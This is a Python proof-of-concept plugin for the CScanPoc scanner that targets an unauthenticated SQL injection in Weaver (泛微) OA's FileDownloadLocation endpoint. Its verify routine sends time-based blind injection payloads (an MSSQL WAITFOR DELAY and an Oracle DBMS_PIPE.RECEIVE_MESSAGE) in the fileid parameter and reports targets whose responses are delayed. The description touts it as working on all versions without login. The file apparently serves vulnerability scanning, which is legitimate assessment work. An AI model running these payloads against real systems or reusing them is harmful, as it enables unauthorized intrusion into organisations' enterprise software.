# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'weaver_0009'  # 平台漏洞编号，留空
    name = '泛微某系统通用型SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-17'  # 漏洞公布时间
    desc = '''
    作为协同管理软件行业的领军企业，泛微有业界优秀的协同管理软件产品。在企业级移动互联大潮下，泛微发布了全新的以“移动化 社交化 平台化 云端化”四化为核心的全一代产品系列，包括面向大中型企业的平台型产品e-cology、面向中小型企业的应用型产品e-office、面向小微型企业的云办公产品eteams，以及帮助企业对接移动互联的移动办公平台e-mobile和帮助快速对接微信、钉钉等平台的移动集成平台等等。
    泛微某系统通用型SQL注入,无需登录直接注入...全版本通杀... 
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=076418
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0e826e26-64f9-4eaa-8b77-d06e8f5dd03f'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            true_url = '/weaver/weaver.email.FileDownloadLocation?fileid=32&download=1'
            start_time = time.time()
            code, head, res, errcode, _ = hh.http(self.target + true_url)
            end_time = time.time()
            true_time = end_time-start_time
            payloads = [
                '/weaver/weaver.email.FileDownloadLocation?fileid=32%20WAITFOR%20DELAY%20\'0:0:5\'&download=1',  # mssql
                # oracle
                '/weaver/weaver.email.FileDownloadLocation?fileid=32%20AND%209285=DBMS_PIPE.RECEIVE_MESSAGE(CHR(72)||CHR(83)||CHR(81)||CHR(70),5)&download=1'
            ]

            for payload in payloads:
                flase_url = self.target+payload
                start_time1 = time.time()
                code1, head1, res1, errcode1, _ = hh.http(flase_url)
                end_time1 = time.time()
                flase_time = end_time1-start_time1
                if code == 200 and flase_time > true_time and flase_time > 5:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;url={url}'.format(
                        target=self.target, name=self.vuln.name, url=flase_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
